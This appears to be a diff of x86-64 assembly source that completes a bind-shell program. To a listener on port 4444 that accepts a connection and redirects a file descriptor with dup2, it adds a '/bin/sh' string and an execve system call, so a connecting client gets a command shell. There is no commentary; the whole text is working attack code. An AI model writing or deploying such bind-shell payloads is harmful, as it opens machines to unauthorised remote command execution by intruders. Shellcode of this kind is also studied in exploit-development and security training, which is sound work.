@@ -5,8 +5,7 @@ sin_family dw 2
 sin_port dw 0x5c11
 sin_addr dd 0
 sin_zero dq 0
-
-
+binsh db '/bin/sh',0
 
 section .bss
 result_socket resd 1
@@ -57,6 +56,12 @@ syscall
 mov rax, 0x21
 mov rdi, [result_socket_conn_accept]
 mov rsi, 2
+syscall
+
+mov rax, 0x3b
+mov rdi, binsh
+mov rsi, 0
+mov rdx, 0
 syscall
 
 
